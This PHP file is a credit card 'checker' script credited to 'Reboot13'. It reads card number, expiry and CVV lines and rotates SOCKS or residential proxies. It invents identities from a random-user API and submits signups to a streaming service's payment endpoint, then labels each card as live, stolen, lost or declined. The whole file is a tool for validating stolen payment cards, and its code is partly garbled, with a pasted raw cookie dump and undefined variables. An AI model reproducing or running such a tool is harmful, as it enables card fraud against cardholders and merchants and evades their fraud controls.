<?php

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

$username = 'aman';
$password = 'aman';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';


////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.curiositystream.com/v1/register/ '); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.curiositystream.com', 
'accept: application/json, text/plain, */*', 
'accept-encoding: gzip, deflate, br',
'content-type: application/json;charset=UTF-8',
'set-cookie: __cfduid=d320500f7927a54170bfe587c0c3bd55e1590053767; expires=Sat, 20-Jun-20 09:36:07 GMT; path=/; domain=.curiositystream.com; HttpOnly; SameSite=Lax
set-cookie: cs_session=56f6df0b206550b7e047c199e188634e7bf71b06; expires=Fri, 22-May-2020 09:36:09 GMT; Max-Age=86400; path=/; domain=.curiositystream.com
set-cookie: AWSELB=0D277D9714E95E051B312DC0FCC4C8B40B2F32C09257D157FCA03A658713EA794B21F557863607200AA0E94DB30D2036794A8189A7C6E9CD0CF0D357408EE3C12C76254EC8;PATH=/;MAX-AGE=10
set-cookie: AWSELBCORS=0D277D9714E95E051B312DC0FCC4C8B40B2F32C09257D157FCA03A658713EA794B21F557863607200AA0E94DB30D2036794A8189A7C6E9CD0CF0D357408EE3C12C76254EC8;PATH=/;MAX-AGE=10;SECURE;SAMESITE=None
status: 422
'origin: https://curiositystream.com',
'referer:https://curiositystream.com/signup ',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 #',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, ' ');

$result = curl_exec($ch);
/*$token = trim(strip_tags(getStr($result,'"id": "','"')));

////////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

 $ch = curl_init();
// /////////========Proxy Zones
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// ////////=========Socks Proxy
// //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.curiositystream.com/v1/register/ ');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: ',
'content-type: application/json;charset=UTF-8',
'Authority: api.curiositystream.com',
'Cookie:'set-cookie: __cfduid=d320500f7927a54170bfe587c0c3bd55e1590053767; expires=Sat, 20-Jun-20 09:36:07 GMT; path=/; domain=.curiositystream.com; HttpOnly; SameSite=Lax
set-cookie: cs_session=56f6df0b206550b7e047c199e188634e7bf71b06; expires=Fri, 22-May-2020 09:36:09 GMT; Max-Age=86400; path=/; domain=.curiositystream.com
set-cookie: AWSELB=0D277D9714E95E051B312DC0FCC4C8B40B2F32C09257D157FCA03A658713EA794B21F557863607200AA0E94DB30D2036794A8189A7C6E9CD0CF0D357408EE3C12C76254EC8;PATH=/;MAX-AGE=10
set-cookie: AWSELBCORS=0D277D9714E95E051B312DC0FCC4C8B40B2F32C09257D157FCA03A658713EA794B21F557863607200AA0E94DB30D2036794A8189A7C6E9CD0CF0D357408EE3C12C76254EC8;PATH=/;MAX-AGE=10;SECURE;SAMESITE=None
'Origin: https://curiositystream.com',
'Referer: https://curiositystream.com/signup',
'Sec-Fetch-Mode: cors',
//'user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 #',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, ' ');
{"referral_source":[{"contact_date":"2020-05-21T14:59:45+05:30","count":1,"referrer":"https://www.google.com/","tags":[{"tag":"clientId","value":"1266910197.1589109857"},{"tag":"page","value":"/"},{"tag":"experiment_id","value":"kIXPGv3NTOGo1VB_PaWzQw-0"}]}],"referral_code":"","email":"$","password":"$","first_name":"$","last_name":"$","zip_code":"17025","country":"US","stripeToken":"tok_1GlAoqIbys3PwYEzmmr70FG5","plan":"HDS","coupon":"","recaptchaToken":"03AGdBq24f8vPEyw43t5LFCM-dI6QG0bPVFAAjMkC2Bh3X7SvZkyjGu34JMRJcQPTJdKWZnYI7O1UvjXzsYc5G_JM1fjXtJCI30bvX9VDdK5eRSpASePLdNv_hVkJKFYbackXRCSGvrauYnRLpFdv-a4L7nkuggZX0AYZ0xnx94ZvPKqoxUQRF2ZEt-VjGbAVwRpUcrPkoPSl4Qi8m4E7osq9oQbNR8GFXol51ZbilQwLKCdpFZy1HBKPK5JWNlWF44kiUE3PTuL4WoWwEmwrPI8EPKig2UMdLyEK2doEizUzNkGKR1iHBUewDIoV1eNGJFJ-ezvZmKswykZrq-QkZKE5yiWKZKDnA3qAELzmp1huQICQHkgrew21TWqJw0FUCFINz7SGtg1O0tx8jO2hEKbnvhPQsMqp90Q"}

$result = curl_exec($ch);*/
$message = trim(strip_tags(getStr($result,'"message":"','"'))); 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CV MATCHED 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED - Incorrect Zip 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Stolen_Card - Sometime Useable 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Lost_Card - Sometime Useable 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Insufficient Funds 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, 'incorrect_zip')) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Insufficient Funds 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Expired 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Pickup Card_Card - Sometime Useable 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Declined 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Generic_Decline 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Do_Not_Honor 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Unchecked [Proxy Dead] 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Fail 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Expired Card 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Doesnt Support This Purchase 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}
 else {
  echo '<span class="new badge red">#Disapproved</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Proxy Dead / Error Not Listed 𝕽𝖊𝖇𝖔𝖔𝖙 ♛</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
echo $result 

///////////////////////////////////////////////===========================Edited By Reboot13================================================\\\\\\\\\\\\\\\
?>
